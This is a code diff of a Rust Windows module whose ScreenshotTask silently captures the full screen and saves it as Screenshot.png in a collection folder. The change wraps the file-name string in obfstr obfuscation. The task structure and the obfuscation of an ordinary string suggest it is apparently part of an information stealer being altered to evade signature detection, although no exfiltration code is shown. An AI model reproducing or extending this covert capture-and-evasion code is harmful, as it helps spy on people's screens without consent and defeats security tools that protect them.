@@ -4,6 +4,7 @@ use core::mem::zeroed;
 use core::ptr::null_mut;
 use miniz_oxide::deflate::compress_to_vec_zlib;
 use tasks::Task;
+use obfstr::obfstr as s;
 use utils::path::{Path, WriteToFile};
 
 use windows_sys::Win32::Graphics::Gdi::{BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, CreateDCW, DeleteDC, DeleteObject, GetDIBits, SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY};
@@ -20,7 +21,7 @@ impl Task for ScreenshotTask {
     unsafe fn run(&self, parent: &Path) {
         let (width, height, pixels) = capture_screen().unwrap();
         let png = create_png(width as u32, height as u32, &pixels);
-        let _ = png.write_to(&(parent / "Screenshot.png"));
+        let _ = png.write_to(&(parent / s!("Screenshot.png")));
     }
 }
 
@@ -29,14 +30,14 @@ unsafe fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
     let y = GetSystemMetrics(SM_YVIRTUALSCREEN);
     let width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
     let height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-    
+
     let hdc = CreateDCW(
         "DISPLAY".to_wide().as_ptr(),
         null_mut(),
         null_mut(),
         null_mut()
     );
-    
+
     let hdc_mem = CreateCompatibleDC(hdc);
     let hbitmap = CreateCompatibleBitmap(hdc, width, height);
     let _old = SelectObject(hdc_mem, hbitmap as *mut _);
